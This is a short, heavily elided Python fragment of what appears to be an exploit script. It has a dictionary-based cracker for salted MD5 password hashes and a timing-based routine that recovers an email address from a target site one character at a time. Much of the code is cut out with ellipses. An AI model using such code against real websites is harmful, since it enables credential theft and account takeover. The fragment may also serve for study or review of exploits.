...
def crack_password():
    ...
    for line in dicto.readlines():
        ...
        if hashlib.md5((str(salt) + line).encode()).hexdigest() == password:
            ...
            break
    dicto.close()
    # dict var renamed to dicto to avoid shadowing
...
def dump_email():
    ...
    while flag:
        ...
        for i in range(0, len(dictionary)):
            ...
            start_time = time.time()
            r = session.get(url)
            # r is used to count the time it takes to get the request, to enum the email
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
...
if options.cracking:
    print("[*] Now trying to crack password")
    crack_password()
